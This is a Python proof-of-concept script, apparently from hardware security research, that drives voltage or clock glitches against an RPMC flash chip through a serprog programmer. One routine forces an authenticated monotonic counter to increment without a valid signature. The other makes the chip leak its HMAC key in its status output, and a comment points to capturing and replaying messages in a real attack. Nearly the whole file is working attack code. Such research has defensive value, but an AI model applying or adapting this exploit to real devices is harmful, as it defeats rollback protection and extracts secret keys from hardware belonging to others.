from serprog import Serprog
from rpmc_ops import *
from datetime import datetime

root_key = b'\xff' * 32


def pretty_print_status(status: bytes):
    assert len(status) == 49

    print(f'Status: {bin(status[0])}\n'
          f'Tag: {status[1:13].hex()}\n'
          f'Value: {int.from_bytes(status[13:17], byteorder='big')}\n'
          f'Signature: {status[17:].hex()}')


def glitch_increment_counter(target_counter: int, attempts: int = 1):
    key_data = b'\x00\x00\x00\x00'
    key = HMAC(root_key, key_data, hashlib.sha256).digest()

    chip = Serprog('/dev/ttyACM0', 1_000_000)

    rpmc_update_hmac_key(chip, key, target_counter, key_data)
    previous_value = rpmc_get_counter(chip, key, target_counter, tag=b'\xaa' * 12)
    print(f'Current counter value: {previous_value}')

    increment_counter_msg = b'\x9b\x02' + target_counter.to_bytes(1)+ b'\x00' + previous_value.to_bytes(4, byteorder='big')
    signature = HMAC(key, increment_counter_msg, hashlib.sha256)
    print(f'Signature to look for {signature.hexdigest()}')

    msg = increment_counter_msg + b'\x42' * 32
    print(f'Sending: {msg.hex()}')
    start = datetime.now()

    success = 0
    for attempt in range(attempts):
        print(f'Try {attempt}')
        for glitch_cycles in range(6080, 6220):
            # This message could also be captured and replayed in a real attack
            rpmc_update_hmac_key(chip, key, target_counter, key_data)

            print(f'Glitching after {glitch_cycles}:')
            chip.exchange(msg, 0, glitch_cycles)
            try:
                rpmc_get_counter(chip, key, target_counter, tag=b'\xaa' * 12)
            except:
                print('Get failed dumping status:')
                full_status = rpmc_get_status(chip)
                pretty_print_status(full_status)
                if full_status.endswith(signature.digest()):
                    print(f'Found correct signature')
                    success += 1
                    break

    print(f'Took {(datetime.now() - start).microseconds}us for {attempts} attempt(s)')
    print(f'Success rate: {success / attempts}')


def leak_hmac_key(target_counter: int):
    key_data = b'\x00\x00\x00\x00'
    # This key is just needed to compare the results against
    key = HMAC(root_key, key_data, hashlib.sha256).digest()

    print(f'Trying to leak the hmac key for "{key_data}"\n'
          f'Looking for {key.hex()}')

    chip = Serprog('/dev/ttyACM0', 1_000_000)
    msg = b'\x9b\x01' + target_counter.to_bytes(1) + b'\x00' + key_data + b'\x42' * 32

    for glitch_cycles in range(6390, 6700):
        chip.exchange(msg, 0, glitch_cycles)
        try:
            rpmc_get_counter(chip, b'\x00' * 32, target_counter, tag=b'\xaa' * 12)
        except:
            print(f'Glitching after {glitch_cycles}:')
            print('Get failed dumping status:')
            full_status = rpmc_get_status(chip)
            pretty_print_status(full_status)
            if full_status.endswith(key):
                print(f'Found hmac key')
                break


if __name__ == '__main__':
    #glitch_increment_counter(0)
    leak_hmac_key(0)
